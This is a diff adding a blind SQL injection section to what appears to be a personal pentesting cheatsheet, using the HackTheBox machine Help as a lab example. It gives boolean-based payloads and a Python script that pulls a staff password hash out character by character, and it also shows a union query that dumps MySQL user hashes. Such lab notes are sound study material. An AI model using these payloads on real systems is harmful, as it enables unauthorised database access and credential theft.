@@ -350,6 +350,57 @@ Show hostname, user, hashed password of a database from union SQLi:
 php?xxx=9999999 union select 1,(select group_concat(host,user,password) FROM mysql.user),3,4,5,6,7
 ```
 
+### Blind SQL Injection:
+Read more: https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi#mysql-boolean-based-blind-sql-injection-cheatsheet
+Example from the machine Help from HTB:
+&param[]=6 and (length(database())) = 7-- -
+returns the site properly:
+database name length has 7 characters
+
+looking at the source code of helpdeskZ
+table name we're looking for is likely to be 'staff'
+
+check if username of 'staff' table is 'admin'
+
+&param[]=6 and ((select username from staff limit 0,1 )) = 'admin'-- -
+returns the site properly -> username is admin
+
+Try and check for length of password (hashed)
+md5: 32 characters
+sha1: 40 characters
+sha256: 64 characters
+
+&param[]=6 and (length((select password from staff limit 0,1 ))) = 32-- -
+does not return site properly -> not 32
+
+&param[]=6 and (length((select password from staff limit 0,1 ))) = 40-- -
+returns site properly -> password hash is sha1
+
+check if first character of the password hash is 'a'
+&param[]=6 and (substr((select password from staff limit 0,1 ),1,1)) = 'a'-- -
+iterate a->f 0->9 until request returns site properly
+
+check for second character:
+&param[]=6 and (substr((select password from staff limit 0,1 ),2,1)) = 'a'-- -
+```
+import requests
+
+url = "http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6"
+cookies = {'lang':'english', 'PHPSESSID':'rq7j4ve8pslipe4fleouu1v8i1', 'usrhash':'0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF/aNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo+EGN+qolsK/yi5VISf+McPtEbfqB02DLW0eQV29VGXE0g=='}
+characters = 'abcdef0123456789'
+hashedPW = ""
+
+for i in range (1,41):
+        for j in characters:
+                payload = f" and (substr((select password from staff limit 0,1 ),{i},1)) = '{j}'-- -"
+                r = requests.get(url+payload, cookies = cookies)
+                if (r.headers['Content-Type'] == 'text/plain;charset=UTF-8'):
+                        print(f"Hash character found: {j}")
+                        hashedPW += j
+                        print(hashedPW)                     
+```
+
+
 ## Serilisation/Deserialisation Exploit
 
 ### Tomcat Apache Deserialisation attack (CVE 2020-9484) with ```ysoserial``` to generate payload
